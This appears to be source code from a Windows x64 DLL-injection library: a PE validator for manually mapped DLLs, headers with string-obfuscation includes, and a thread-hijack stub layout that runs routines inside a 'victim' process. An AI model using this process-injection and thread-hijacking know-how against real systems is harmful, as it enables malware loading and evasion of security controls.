		bool ResolveImports = false;
		bool ResolveDelayImports = false;
		bool EnableExceptions = false;
		bool InitializeSecurityCookie = false;
		bool ExecuteTls = false;
	};

	struct VIEW
	{
		const BYTE * Data = nullptr;
		size_t Size = 0;
		const IMAGE_NT_HEADERS64 * NtHeaders = nullptr;
		const IMAGE_SECTION_HEADER * Sections = nullptr;
	};

	struct MAPPING
	{
		const BYTE * Data = nullptr;
		size_t Available = 0;
	};

	__forceinline bool RangeWithin(size_t offset, size_t count, size_t total)
	{
		return offset <= total && count <= total - offset;
	}

	__forceinline bool IsPowerOfTwo(DWORD value)
	{
		return value != 0 && (value & (value - 1)) == 0;
	}

	__forceinline bool IsAligned(DWORD value, DWORD alignment)
	{
		return IsPowerOfTwo(alignment) && (value & (alignment - 1)) == 0;
	}

	__forceinline const IMAGE_SECTION_HEADER * FindSection(const VIEW & view, DWORD rva)
	{
		const IMAGE_FILE_HEADER & file_header = view.NtHeaders->FileHeader;

		for (WORD index = 0; index < file_header.NumberOfSections; ++index)
		{
			const IMAGE_SECTION_HEADER & section = view.Sections[index];
			const DWORD span = (std::max)(section.Misc.VirtualSize, section.SizeOfRawData);
			if (rva >= section.VirtualAddress && rva - section.VirtualAddress < span)
			{
				return &section;
			}
		}

		return nullptr;
	}

	__forceinline MAPPING MapRva(const VIEW & view, DWORD rva)
	{
		if (rva < view.NtHeaders->OptionalHeader.SizeOfHeaders)
		{
			if (!RangeWithin(rva, 1, view.Size))
			{
				return {};
			}

			return { view.Data + rva, view.NtHeaders->OptionalHeader.SizeOfHeaders - rva };
		}

		const IMAGE_SECTION_HEADER * section = FindSection(view, rva);
		if (!section || !section->SizeOfRawData)
		{
			return {};
		}

		const DWORD raw_offset = rva - section->VirtualAddress;
		if (raw_offset >= section->SizeOfRawData)
		{
			return {};
		}

		return { view.Data + section->PointerToRawData + raw_offset, section->SizeOfRawData - raw_offset };
	}

	__forceinline bool IsZeroTerminated(const BYTE * data, size_t available)
	{
		for (size_t index = 0; index < available; ++index)
		{
			if (data[index] == 0)
			{
				return true;
			}
		}

		return false;
	}

	__forceinline bool MeasureThunkTable(const VIEW & view, DWORD rva, size_t & count_out);

	__forceinline bool ValidateThunkTable(const VIEW & view, DWORD rva)
	{
		size_t count = 0;
		return MeasureThunkTable(view, rva, count);
	}

	__forceinline bool MeasureThunkTable(const VIEW & view, DWORD rva, size_t & count_out)
	{
		count_out = 0;
		const MAPPING mapping = MapRva(view, rva);
		if (!mapping.Data || mapping.Available < sizeof(IMAGE_THUNK_DATA64))
		{
			return false;
		}

		const size_t maximum_entries = mapping.Available / sizeof(IMAGE_THUNK_DATA64);
		for (size_t index = 0; index < maximum_entries; ++index)
		{
			const IMAGE_THUNK_DATA64 & thunk = *reinterpret_cast<const IMAGE_THUNK_DATA64 *>(mapping.Data + index * sizeof(IMAGE_THUNK_DATA64));
			if (!thunk.u1.AddressOfData)
			{
				count_out = index;
				return true;
			}

			if (!IMAGE_SNAP_BY_ORDINAL(thunk.u1.Ordinal))
			{
				if ((thunk.u1.AddressOfData >> 32) != 0)
				{
					return false;
				}
				const MAPPING name_mapping = MapRva(view, static_cast<DWORD>(thunk.u1.AddressOfData));
				if (!name_mapping.Data || name_mapping.Available < sizeof(WORD) || !IsZeroTerminated(name_mapping.Data + sizeof(WORD), name_mapping.Available - sizeof(WORD)))
				{
					return false;
				}
			}
		}

		return false;
	}

	__forceinline bool ValidateImports(const VIEW & view)
	{
		const IMAGE_DATA_DIRECTORY & directory = view.NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
		if (!directory.Size)
		{
			return true;
		}

		const MAPPING mapping = MapRva(view, directory.VirtualAddress);
		if (!mapping.Data || mapping.Available < directory.Size || directory.Size < sizeof(IMAGE_IMPORT_DESCRIPTOR))
		{
			return false;
		}

		for (size_t offset = 0; offset + sizeof(IMAGE_IMPORT_DESCRIPTOR) <= directory.Size; offset += sizeof(IMAGE_IMPORT_DESCRIPTOR))
		{
			const IMAGE_IMPORT_DESCRIPTOR & descriptor = *reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR *>(mapping.Data + offset);
			if (!descriptor.Name)
			{
				return true;
			}

			if (!MapRva(view, descriptor.Name).Data)
			{
				return false;
			}

			const DWORD thunk_rva = descriptor.OriginalFirstThunk ? descriptor.OriginalFirstThunk : descriptor.FirstThunk;
			if (!thunk_rva || !ValidateThunkTable(view, thunk_rva))
			{
				return false;
			}

			if (!descriptor.FirstThunk || !RangeWithin(descriptor.FirstThunk, sizeof(IMAGE_THUNK_DATA64), view.NtHeaders->OptionalHeader.SizeOfImage))
			{
				return false;
			}

			if (descriptor.OriginalFirstThunk)
			{
				size_t ilt_count = 0;
				if (!MeasureThunkTable(view, descriptor.OriginalFirstThunk, ilt_count))
				{
					return false;
				}
				const size_t iat_bytes = (ilt_count + 1) * sizeof(IMAGE_THUNK_DATA64);
				if (ilt_count + 1 < ilt_count || !RangeWithin(descriptor.FirstThunk, iat_bytes, view.NtHeaders->OptionalHeader.SizeOfImage))
				{
					return false;
				}
			}
		}

		return false;
	}

	__forceinline bool ValidateDelayImports(const VIEW & view)
	{
		const IMAGE_DATA_DIRECTORY & directory = view.NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
		if (!directory.Size)
		{
			return true;
		}

		const MAPPING mapping = MapRva(view, directory.VirtualAddress);
		if (!mapping.Data || mapping.Available < directory.Size || directory.Size < sizeof(IMAGE_DELAYLOAD_DESCRIPTOR))
		{
			return false;
		}

		for (size_t offset = 0; offset + sizeof(IMAGE_DELAYLOAD_DESCRIPTOR) <= directory.Size; offset += sizeof(IMAGE_DELAYLOAD_DESCRIPTOR))
		{
			const IMAGE_DELAYLOAD_DESCRIPTOR & descriptor = *reinterpret_cast<const IMAGE_DELAYLOAD_DESCRIPTOR *>(mapping.Data + offset);
			if (!descriptor.DllNameRVA)
			{
				return true;
			}

			if (!MapRva(view, descriptor.DllNameRVA).Data ||
				!descriptor.ImportAddressTableRVA ||
				!RangeWithin(descriptor.ImportAddressTableRVA, sizeof(IMAGE_THUNK_DATA64), view.NtHeaders->OptionalHeader.SizeOfImage) ||
				!descriptor.ImportNameTableRVA ||
				!ValidateThunkTable(view, descriptor.ImportNameTableRVA))
			{
				return false;
			}

			{
				size_t name_count = 0;
				if (!MeasureThunkTable(view, descriptor.ImportNameTableRVA, name_count))
				{
					return false;
				}
				const size_t iat_bytes = (name_count + 1) * sizeof(IMAGE_THUNK_DATA64);
				if (name_count + 1 < name_count || !RangeWithin(descriptor.ImportAddressTableRVA, iat_bytes, view.NtHeaders->OptionalHeader.SizeOfImage))
				{
					return false;
				}
			}
		}

		return false;
	}

	__forceinline bool ValidateExports(const VIEW & view)
	{
		const IMAGE_DATA_DIRECTORY & directory = view.NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
		if (!directory.Size)
		{
			return false;
		}

		const MAPPING mapping = MapRva(view, directory.VirtualAddress);
		if (!mapping.Data || mapping.Available < directory.Size || directory.Size < sizeof(IMAGE_EXPORT_DIRECTORY))
		{
			return false;
		}

		const IMAGE_EXPORT_DIRECTORY & exports = *reinterpret_cast<const IMAGE_EXPORT_DIRECTORY *>(mapping.Data);
		if (!exports.NumberOfFunctions || !exports.NumberOfNames || !exports.AddressOfFunctions || !exports.AddressOfNames || !exports.AddressOfNameOrdinals)
		{
			return false;
		}

		const MAPPING functions = MapRva(view, exports.AddressOfFunctions);
		const MAPPING names = MapRva(view, exports.AddressOfNames);
		const MAPPING ordinals = MapRva(view, exports.AddressOfNameOrdinals);
		const size_t function_bytes = static_cast<size_t>(exports.NumberOfFunctions) * sizeof(ULONG);
		const size_t name_bytes = static_cast<size_t>(exports.NumberOfNames) * sizeof(ULONG);
		const size_t ordinal_bytes = static_cast<size_t>(exports.NumberOfNames) * sizeof(USHORT);
		if (!functions.Data || !names.Data || !ordinals.Data || function_bytes > functions.Available || name_bytes > names.Available || ordinal_bytes > ordinals.Available)
		{
			return false;
		}

		for (DWORD index = 0; index < exports.NumberOfNames; ++index)
		{
			const DWORD name_rva = *reinterpret_cast<const DWORD *>(names.Data + index * sizeof(DWORD));
			const USHORT ordinal = *reinterpret_cast<const USHORT *>(ordinals.Data + index * sizeof(USHORT));
			if (!name_rva || ordinal >= exports.NumberOfFunctions || !MapRva(view, name_rva).Data)
			{
				return false;
			}
		}

		return true;
	}

	__forceinline bool ValidateRelocations(const VIEW & view)
	{
		const IMAGE_DATA_DIRECTORY & directory = view.NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		if (!directory.Size)
		{
			return false;
		}

		const MAPPING mapping = MapRva(view, directory.VirtualAddress);
		if (!mapping.Data || mapping.Available < directory.Size)
		{
			return false;
		}

		size_t offset = 0;
		while (offset < directory.Size)
		{
			if (directory.Size - offset < sizeof(IMAGE_BASE_RELOCATION))
			{
				return false;
			}

			const IMAGE_BASE_RELOCATION & block = *reinterpret_cast<const IMAGE_BASE_RELOCATION *>(mapping.Data + offset);
			if (block.SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION) || block.SizeOfBlock > directory.Size - offset || (block.SizeOfBlock & 1))
			{
				return false;
			}

			const size_t entry_count = (block.SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			const WORD * entries = reinterpret_cast<const WORD *>(mapping.Data + offset + sizeof(IMAGE_BASE_RELOCATION));
			for (size_t index = 0; index < entry_count; ++index)
			{
				const WORD type = entries[index] >> 12;
				if (type == IMAGE_REL_BASED_ABSOLUTE)
				{
					continue;
				}
				if (type != IMAGE_REL_BASED_DIR64)
				{
					return false;
				}

				const ULONGLONG patch_rva = static_cast<ULONGLONG>(block.VirtualAddress) + static_cast<ULONGLONG>(entries[index] & 0x0FFF);

				if (view.NtHeaders->OptionalHeader.SizeOfImage < sizeof(ULONG_PTR) ||
					patch_rva > static_cast<ULONGLONG>(view.NtHeaders->OptionalHeader.SizeOfImage - sizeof(ULONG_PTR)))
				{
					return false;
				}
			}

			offset += block.SizeOfBlock;
		}

		return offset == directory.Size;
	}

	__forceinline DWORD Validate(const BYTE * data, size_t size, DWORD target_machine, const OPTIONS & options, VIEW & view)
	{
		if (!data || size < sizeof(IMAGE_DOS_HEADER))
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}

		const IMAGE_DOS_HEADER & dos_header = *reinterpret_cast<const IMAGE_DOS_HEADER *>(data);
		if (dos_header.e_magic != IMAGE_DOS_SIGNATURE || dos_header.e_lfanew < sizeof(IMAGE_DOS_HEADER))
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}

		const size_t nt_offset = static_cast<size_t>(dos_header.e_lfanew);
		if (!RangeWithin(nt_offset, sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER64), size))
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}

		const IMAGE_NT_HEADERS64 & nt_headers = *reinterpret_cast<const IMAGE_NT_HEADERS64 *>(data + nt_offset);
		if (nt_headers.Signature != IMAGE_NT_SIGNATURE || nt_headers.FileHeader.Machine != target_machine || nt_headers.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}

		if (nt_headers.FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64) || !RangeWithin(nt_offset + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER), nt_headers.FileHeader.SizeOfOptionalHeader, size))
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}

		const WORD section_count = nt_headers.FileHeader.NumberOfSections;
		if (!section_count || section_count > MAX_SECTION_COUNT)
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}

		const size_t section_table_offset = nt_offset + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt_headers.FileHeader.SizeOfOptionalHeader;
		const size_t section_table_size = static_cast<size_t>(section_count) * sizeof(IMAGE_SECTION_HEADER);
		const DWORD file_alignment = nt_headers.OptionalHeader.FileAlignment;
		const DWORD section_alignment = nt_headers.OptionalHeader.SectionAlignment;
		const DWORD size_of_headers = nt_headers.OptionalHeader.SizeOfHeaders;
		const DWORD size_of_image = nt_headers.OptionalHeader.SizeOfImage;

		if (nt_headers.OptionalHeader.NumberOfRvaAndSizes > IMAGE_NUMBEROF_DIRECTORY_ENTRIES ||
			!IsPowerOfTwo(file_alignment) || file_alignment < 0x200 || file_alignment > 0x10000 ||
			!IsPowerOfTwo(section_alignment) || section_alignment < file_alignment || section_alignment > 0x10000 ||
			!IsAligned(size_of_headers, file_alignment) || !IsAligned(size_of_image, section_alignment) ||
			!size_of_headers || size_of_headers > size || size_of_headers > size_of_image || size_of_headers > MAX_IMAGE_SIZE || size_of_image > MAX_IMAGE_SIZE ||
			!RangeWithin(nt_offset, section_table_offset - nt_offset + section_table_size, size_of_headers) ||
			!RangeWithin(section_table_offset, section_table_size, size))
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}

		if (options.RequireDll && !(nt_headers.FileHeader.Characteristics & IMAGE_FILE_DLL))
		{
			return FILE_ERR_INVALID_FILE;
		}

		if (nt_headers.OptionalHeader.AddressOfEntryPoint >= size_of_image ||
			nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size)
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}

		const IMAGE_SECTION_HEADER * sections = reinterpret_cast<const IMAGE_SECTION_HEADER *>(data + section_table_offset);
		view.Data = data;
		view.Size = size;
		view.NtHeaders = &nt_headers;
		view.Sections = sections;

		for (WORD index = 0; index < section_count; ++index)
		{
			const IMAGE_SECTION_HEADER & section = sections[index];
			const ULONGLONG section_span = (std::max)(static_cast<ULONGLONG>(section.Misc.VirtualSize), static_cast<ULONGLONG>(section.SizeOfRawData));
			const ULONGLONG section_end = static_cast<ULONGLONG>(section.VirtualAddress) + section_span;
			if (!section.VirtualAddress || !IsAligned(section.VirtualAddress, section_alignment) || section_end > size_of_image)
			{
				return FILE_ERR_INVALID_PE_LAYOUT;
			}

			if (static_cast<ULONGLONG>(section.VirtualAddress) < static_cast<ULONGLONG>(size_of_headers))
			{
				return FILE_ERR_INVALID_PE_LAYOUT;
			}

			if (section.SizeOfRawData)
			{
				if (!IsAligned(section.PointerToRawData, file_alignment) || section.PointerToRawData < size_of_headers || !RangeWithin(section.PointerToRawData, section.SizeOfRawData, size))
				{
					return FILE_ERR_INVALID_PE_LAYOUT;
				}
			}

			for (WORD prior = 0; prior < index; ++prior)
			{
				const IMAGE_SECTION_HEADER & other = sections[prior];
				const ULONGLONG other_span = (std::max)(static_cast<ULONGLONG>(other.Misc.VirtualSize), static_cast<ULONGLONG>(other.SizeOfRawData));
				const ULONGLONG other_end = static_cast<ULONGLONG>(other.VirtualAddress) + other_span;
				if (static_cast<ULONGLONG>(section.VirtualAddress) < other_end &&
					static_cast<ULONGLONG>(other.VirtualAddress) < section_end)
				{
					return FILE_ERR_INVALID_PE_LAYOUT;
				}

				if (section.SizeOfRawData && other.SizeOfRawData)
				{
					const ULONGLONG raw_end = static_cast<ULONGLONG>(section.PointerToRawData) + section.SizeOfRawData;
					const ULONGLONG other_raw_end = static_cast<ULONGLONG>(other.PointerToRawData) + other.SizeOfRawData;
					if (static_cast<ULONGLONG>(section.PointerToRawData) < other_raw_end &&
						static_cast<ULONGLONG>(other.PointerToRawData) < raw_end)
					{
						return FILE_ERR_INVALID_PE_LAYOUT;
					}
				}
			}
		}

		for (DWORD index = 0; index < nt_headers.OptionalHeader.NumberOfRvaAndSizes; ++index)
		{
			const IMAGE_DATA_DIRECTORY & directory = nt_headers.OptionalHeader.DataDirectory[index];
			if (!directory.Size)
			{
				continue;
			}

			if (index == IMAGE_DIRECTORY_ENTRY_SECURITY)
			{
				if (!RangeWithin(directory.VirtualAddress, directory.Size, size))
				{
					return FILE_ERR_INVALID_PE_LAYOUT;
				}
			}
			else if (!RangeWithin(directory.VirtualAddress, directory.Size, size_of_image))
			{
				return FILE_ERR_INVALID_PE_LAYOUT;
			}
		}

		const IMAGE_DATA_DIRECTORY & load_config = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
		if (load_config.Size && load_config.Size < offsetof(IMAGE_LOAD_CONFIG_DIRECTORY, SecurityCookie) + sizeof(ULONG_PTR))
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}
		const IMAGE_DATA_DIRECTORY & exceptions = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
		if (exceptions.Size && exceptions.Size % sizeof(RUNTIME_FUNCTION))
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}
		if (options.EnableExceptions && !exceptions.Size)
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}

		const IMAGE_DATA_DIRECTORY & tls = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
		if (tls.Size)
		{
			const MAPPING tls_mapping = MapRva(view, tls.VirtualAddress);
			if (tls.Size < sizeof(IMAGE_TLS_DIRECTORY) || !tls_mapping.Data || tls_mapping.Available < sizeof(IMAGE_TLS_DIRECTORY))
			{
				return FILE_ERR_INVALID_PE_LAYOUT;
			}
		}

		if (options.RequireExports && !ValidateExports(view))
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}

		if (options.RequireRelocations && !ValidateRelocations(view))
		{
			return FILE_ERR_RELOCATIONS_REQUIRED;
		}

		if ((options.ResolveImports && !ValidateImports(view)) || (options.ResolveDelayImports && !ValidateDelayImports(view)))
		{
			return FILE_ERR_INVALID_PE_LAYOUT;
		}

		return FILE_ERR_SUCCESS;
	}
}

```

### Ameger/Core/Utility/Header/PrecompiledHeader.h â€” 57 lines â€” sha12:5CF575B2F544
```c-header
#pragma once

#ifndef _WIN64
#error This build is x64-only: 32-bit / WOW64 support has been eradicated (ManualMap + HijackThread only).
#endif

#include <Windows.h>
#include "../../../Injection.h"
#include "Core/Foundation/Primitives/InjectionTypes.h"
#include "Core/Foundation/Primitives/KcStrings/Core/XorString.h"
#include "Core/Foundation/Primitives/KcStrings/Core/KcStrSuite.h"

#include <atomic>

#if defined(NTDDI_VERSION) && (NTDDI_VERSION < NTDDI_WIN11)
#error The mininum requirement for this library is Windows 11.
#endif

#if __has_include(<format>)
#include <format>
#endif
#include <iomanip>
#include <sstream>
#include <string>
#include <tchar.h>

#include <fstream>
#include <shlwapi.h>

#include <ctime>
#include <chrono>
#include <map>
#include <memory>
#include <random>

#include <algorithm>
#include <vector>

#include <DbgHelp.h>

#include <thread>

#include <WinInet.h>
#include <Urlmon.h>

#pragma warning(disable: 4201)
#pragma warning(disable: 4324)
#pragma warning(disable: 6001)
#pragma warning(disable: 6258)
#pragma warning(disable: 28159)

#ifndef RECA_DEFINED
#define RECA_DEFINED
#define ReCa reinterpret_cast
#endif

#define MDWD(p) (DWORD)((ULONG_PTR)p & 0xFFFFFFFF)

// Self-contained: use EXPORT_FUNCTION(...) inside the exported function body.
// __pragma keeps the linker directive valid without a leading #pragma, and the
// macro no longer expands to a bare token sequence that only works there.
#define EXPORT_FUNCTION(export_name, link_name) __pragma(comment(linker, "/EXPORT:" export_name "=" link_name))

#define ALIGN_8 __declspec(align(8))
#define ALIGN ALIGN_8

inline std::atomic<f_raw_print_callback> g_print_raw_callback{nullptr};

void custom_print(int indention_offset, const char * format, ...);

DWORD __stdcall SetRawPrintCallback(f_raw_print_callback print);

#ifdef AMEGER_KEEP_RUNTIME_LOGS
#define LOG custom_print
#else
#define LOG(...) ((void)0)
#endif

```

### Ameger/Core/Utility/Tools/Tools.h â€” 104 lines â€” sha12:837B410932B8
```c-header
#pragma once

#include "Core/Utility/Header/PrecompiledHeader.h"

#include "Core/Foundation/Error.h"
#include "Core/Utility/Binary/PEImage.h"
#include "NT/NTDefinitions.h"

#include "NT/NTFunctions.h"
#include "../../../Injection.h"

#define ALIGN_UP(X, A) ((((ULONG_PTR)(X)) + ((ULONG_PTR)(A) - 1)) & (~(((ULONG_PTR)(A)) - 1)))

__forceinline PE_IMAGE::OPTIONS BuildPeValidationOptions(DWORD flags)
{
	PE_IMAGE::OPTIONS options;
	options.RequireDll = true;
	options.RequireRelocations = true;
	options.ResolveImports = (flags & (INJ_MM_RESOLVE_IMPORTS | INJ_MM_RUN_DLL_MAIN)) != 0;
	options.ResolveDelayImports = (flags & INJ_MM_RESOLVE_DELAY_IMPORTS) != 0;
	options.EnableExceptions = (flags & INJ_MM_ENABLE_EXCEPTIONS) != 0;
	options.InitializeSecurityCookie = (flags & INJ_MM_INIT_SECURITY_COOKIE) != 0;
	options.ExecuteTls = (flags & INJ_MM_EXECUTE_TLS) != 0;
	return options;
}

inline HINSTANCE g_hInjMod = NULL;

struct ERROR_INFO

{
	std::wstring	DllFileName;
	std::wstring	TargetProcessExeFileName;
	DWORD			TargetProcessId;
	DWORD			Flags;
	DWORD			ErrorCode;
	DWORD			AdvErrorCode;
	ULONG_PTR		HandleValue;
	int				bNative;
	int				Line;

	BYTE *	RawData;
	DWORD	RawSize;
};

struct INJECTION_SOURCE
{
	BYTE *	RawData		= nullptr;
	DWORD	RawSize		= 0;
};

inline std::wstring	g_RootPathW;

inline DWORD g_OSVersion = 0;
inline DWORD g_OSBuildNumber = 0;

#define g_Windows11_21H2 22000
#define g_Windows11_22H2 22621
#define g_Windows11_23H2 22631
#define g_Windows11_24H2 26100
#define g_Windows11_25H2 26200
#define g_Windows11_26H2 26300
// The highest build whose loader layout is validated. 26300-26999 is assumed
// to share the 26H2 layout; a build above this ceiling is refused rather than
// guessed at, because neither the loader offsets nor the exception-table
// encoding can be assumed to be unchanged.
#define g_Windows11_KnownMaxBuild 26999

enum class WINDOWS_LAYOUT_FAMILY
{
	Windows11_21H2,
	Windows11_22H2,
	Windows11_24H2,
	Windows11_25H2,
	Windows11_26H2
};

DWORD GetOSVersion(DWORD * error_code = nullptr);

DWORD GetOSBuildVersion();

bool GetSupportedWindowsLayout(DWORD build_number, WINDOWS_LAYOUT_FAMILY & layout_family);

DWORD ValidateDllFileInMemory(const BYTE * RawData, DWORD RawSize, DWORD target_machine, DWORD flags = 0);

bool GetOwnModulePathW(std::wstring & out);

bool GetSymbolCacheRoot(std::wstring & out);

bool BuildStablePdbCachePath(const std::wstring & pdb_name, const std::wstring & guid_and_age, std::wstring & out);

bool DeleteSymbolCacheRoot(const std::wstring & root);

bool IsOwnedScratchRoot(const std::wstring & root);

#define AMEGER_SCRATCH_LEAF_DIR L".symbols"

bool IsNativeProcess(HANDLE hTargetProc, DWORD * error_code = nullptr);

bool AllowDirectHandleFallback();

bool SymbolDownloadDisabled();

void ErrorLog(const ERROR_INFO & info);

struct ASYNC_WORKER_SLOT
{
	HANDLE Thread = nullptr;
	HANDLE Done = nullptr;
	DWORD Result = 0;
};

bool StartAsyncWorker(ASYNC_WORKER_SLOT & slot, LPTHREAD_START_ROUTINE entry, void * param);

bool PollAsyncWorker(ASYNC_WORKER_SLOT & slot);

void JoinAsyncWorker(ASYNC_WORKER_SLOT & slot);

bool WaitAsyncWorkerThread(const ASYNC_WORKER_SLOT & slot);

std::wstring CharArrayToStdWstring(const char * szString);

// Shared by the tool helpers and the handle-acquisition scan: an ASCII-only
// lowercase copy. It is deliberately not locale-aware; every caller compares
// against ASCII names (process image names, environment values).
inline std::wstring LowercaseW(const std::wstring & text)
{
	std::wstring out = text;

	for (size_t i = 0; i < out.size(); ++i)
	{
		wchar_t & c = out[i];
		if (c >= L'A' && c <= L'Z')
		{
			c = static_cast<wchar_t>(c - L'A' + L'a');
		}
	}

	return out;
}

void __stdcall StartDownload();

```

### Ameger/Execution/Routine/StartRoutine.h â€” 92 lines â€” sha12:768C25690292
```c-header
#pragma once

#include "System/Information/ProcessInformation.h"
#include "Core/Utility/Tools/Tools.h"

enum class SR_REMOTE_STATE : ULONG_PTR
{
	SR_RS_ExecutionPending	= 0,
	SR_RS_Executing			= 1,
	SR_RS_ExecutionFinished	= 2,
	// The stub publishes the exit sentinel after the routine has returned and
	// while the state page is still addressed, so the host can tell a routine
	// that finished from one that is still unwinding.
	SR_RS_Exited			= 3
};

__forceinline bool RemoteRoutineSettled(SR_REMOTE_STATE state)
{
	return state >= SR_REMOTE_STATE::SR_RS_ExecutionFinished;
}

using f_Routine			= DWORD(__fastcall *)(void * pArg);

#define SR_FP_FLAG_XSAVE 0x00000001
#define SR_FP_AREA 128
#define SR_FP_AREA_SIZE 864
#define SR_SAVED_RSP 96
#define SR_CYCLES_DELTA 80
// The RSP the stub actually pivoted to. The host checks it against the shell
// stack window below, so a stub that did not pivot cannot pass as one that did.
#define SR_SHELL_RSP 88

// A9: the victim TEB stack bounds (StackBase, StackLimit), saved while the
// shell stack is published as the thread's stack for the routine's duration.
// They live in the reserved padding after SR_REMOTE_DATA's 96 bytes, which
// the stub owns alongside SR_SAVED_RSP.
#define SR_SAVED_STACKBASE 104
#define SR_SAVED_STACKLIMIT 112

// Dedicated shell stack geometry, mirrored from Execution/Stub/RemoteShell.inc.
// The stack is the third page group of the same allocation: code page, state
// page, then the stack. The first 128 bytes of victim stack are still used for
// the register spill (victim values only), but no shell frame ever touches it.
#define SR_SHELL_STACK_BASE 0x2000
#define SR_SHELL_STACK_SIZE 0x100000
// 16-byte aligned top of the stack, minus the caller's 64-byte shadow slot.
#define SR_SHELL_STACK_TOP 0x101FC0

// XCR0 components the hijack stub is allowed to request. Mirrors the SR_FP_* constants
// in Execution/Stub/RemoteShell.inc; the stub narrows this further against the
// victim's own XCR0 with XGETBV before it issues XSAVE.
#define SR_FP_XCR0_X87 0x00000001
#define SR_FP_XCR0_SSE 0x00000002
#define SR_FP_XCR0_AVX 0x00000004
#define SR_FP_XCR0_MASK 0x00000007

// XSAVE image geometry: 64-byte XSAVE header + 512-byte legacy region, plus the
// 256-byte YMM region when AVX is part of the requested mask.
#define SR_FP_XSAVE_LEGACY_BYTES 576
#define SR_FP_AVX_BYTES 256

ALIGN struct SR_REMOTE_DATA
{
	ALIGN SR_REMOTE_STATE	State				= SR_REMOTE_STATE::SR_RS_ExecutionPending;
	ALIGN DWORD				Ret					= 0;
	ALIGN DWORD				LastWin32Error		= 0;
	ALIGN void *			pArg				= nullptr;
	ALIGN f_Routine			pRoutine			= nullptr;
	ALIGN UINT_PTR			Buffer				= 0;
	ALIGN DWORD				FpFlags				= 0;
	ALIGN DWORD				FpMask				= 0;
	ALIGN WORD				ShellCw				= 0x037F;
	ALIGN DWORD				ShellMxcsr			= 0x01F80;
	// The stub installs a known control word and MXCSR before the routine
	// runs, and restores the originals afterwards.
	ALIGN unsigned __int64	RoutineCyclesDelta	= 0;
	ALIGN ULONG_PTR			ShellStackTop		= 0;
};

static_assert(sizeof(SR_REMOTE_DATA) == 96);
static_assert(offsetof(SR_REMOTE_DATA, Ret) == 8);
static_assert(offsetof(SR_REMOTE_DATA, LastWin32Error) == 16);
static_assert(offsetof(SR_REMOTE_DATA, pArg) == 24);
static_assert(offsetof(SR_REMOTE_DATA, pRoutine) == 32);
static_assert(offsetof(SR_REMOTE_DATA, Buffer) == 40);
static_assert(offsetof(SR_REMOTE_DATA, FpFlags) == 48);
static_assert(offsetof(SR_REMOTE_DATA, FpMask) == 56);
static_assert(offsetof(SR_REMOTE_DATA, ShellCw) == 64);
static_assert(offsetof(SR_REMOTE_DATA, ShellMxcsr) == 72);
static_assert(offsetof(SR_REMOTE_DATA, RoutineCyclesDelta) == 80);
static_assert(offsetof(SR_REMOTE_DATA, ShellStackTop) == 88);

extern "C" BYTE RemoteThreadHijackBegin[];
extern "C" BYTE RemoteThreadHijackEnd[];
extern "C" BYTE RemoteThreadReturnTarget[];
extern "C" BYTE RemoteThreadState[];

extern "C" BYTE RemoteThreadLeaStateIn[];
extern "C" BYTE RemoteThreadLeaStateOut[];
extern "C" BYTE RemoteThreadJmpReturn[];
extern "C" BYTE RemoteThreadTebReadIn[];
extern "C" BYTE RemoteThreadTebReadOut[];
extern "C" BYTE RemoteThreadTebWrite[];

DWORD StartRoutine(HANDLE hTargetProc, f_Routine pRoutine, void * pArg, DWORD Flags, DWORD & Out, DWORD Timeout, ULONG_PTR SponsorThread, DWORD SponsorTid, HANDLE CompletionEvent, ERROR_DATA & error_data);

DWORD SR_HijackThread		(HANDLE hTargetProc, f_Routine pRoutine, void * pArg,							DWORD & Out, DWORD Timeout, DWORD Flags, ULONG_PTR SponsorThread, DWORD SponsorTid, HANDLE CompletionEvent, ERROR_DATA & error_data);

```

### Ameger/Execution/Stub/RemoteShell.inc â€” 70 lines â€” sha12:51F1E34C3CC4
```c-header
SR_STATE EQU 0
SR_RET EQU 8
SR_LAST_ERROR EQU 16
SR_ARG EQU 24
SR_ROUTINE EQU 32
SR_BUFFER EQU 40
SR_FP_FLAGS EQU 48
SR_FP_MASK EQU 56
SR_SHELL_CW EQU 64
SR_SHELL_MXCSR EQU 72
SR_CYCLES_DELTA EQU 80
;; The RSP the stub actually pivoted to. The host compares it against the
;; allocation window, so a stub that failed to pivot cannot pass silently.
SR_SHELL_RSP EQU 88
SR_FP_FLAG_XSAVE EQU 1
SR_FP_AREA EQU 128
SR_FP_AREA_SIZE EQU 864
SR_SAVED_RSP EQU 96
;; A9: the victim TEB's stack bounds, saved while the shell stack is
;; published as this thread's stack for the routine's duration. These two
;; slots live in the reserved padding after SR_REMOTE_DATA's 96 bytes.
SR_SAVED_STACKBASE EQU 104
SR_SAVED_STACKLIMIT EQU 112

